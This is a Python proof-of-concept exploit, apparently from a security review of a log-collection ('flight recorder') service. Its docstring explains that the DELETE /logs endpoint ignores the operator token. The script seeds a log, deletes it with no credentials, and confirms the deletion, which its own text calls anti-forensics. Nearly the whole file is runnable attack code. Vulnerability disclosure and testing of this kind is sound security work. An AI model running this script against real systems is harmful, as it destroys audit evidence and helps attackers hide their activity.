#!/usr/bin/env python3
"""
PoC #2: Unauthenticated log wipe (damage / anti-forensics)
----------------------------------------------------------
DELETE /logs/{name} is meant to be an operator-only action (X-Operator-Token
header), but the handler never checks the token (Main.routes, the
`DELETE -> "logs" /: rest` case reads the header into `_` and ignores it). Any
unauthenticated client can destroy a module's logs - erasing the very evidence
the flight recorder exists to keep.

Verification is over HTTP only: ingest a line into a fresh source, confirm the
file is downloadable, then DELETE it WITH NO TOKEN and confirm it is gone (404).

Run LOG first, then:  python3 02_unauth_wipe.py [host] [port]
"""
import json
import sys
import urllib.error
import urllib.request
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
BASE = f"http://{HOST}:{PORT}"


def do(method, path, data=None, headers=None):
    req = urllib.request.Request(f"{BASE}{path}", data=data, method=method)
    for k, v in (headers or {}).items():
        req.add_header(k, v)
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def main():
    src = f"victim_{uuid.uuid4().hex[:8]}"
    body = json.dumps({"source": src, "message": "critical audit trail"}).encode()
    do("POST", "/ingest", body, {"Content-Type": "application/json"})

    status, _ = do("GET", f"/logs/{src}.log")
    print(f"[*] Victim log present: GET /logs/{src}.log -> {status}")
    if status != 200:
        print("[-] Could not seed the victim log; aborting.")
        sys.exit(1)

    # No X-Operator-Token header at all.
    status, resp = do("DELETE", f"/logs/{src}.log")
    print(f"[*] Unauthenticated DELETE -> {status} {resp[:120]!r}")

    status_after, _ = do("GET", f"/logs/{src}.log")
    print(f"[*] After wipe: GET /logs/{src}.log -> {status_after}")

    deleted = False
    try:
        deleted = json.loads(resp).get("deleted") is True
    except Exception:
        pass

    if deleted and status_after == 404:
        print("[+] Unauthenticated wipe confirmed - log destroyed without any token")
    else:
        print("[-] Wipe did not take effect without a token (may be patched).")
        sys.exit(1)


if __name__ == "__main__":
    main()
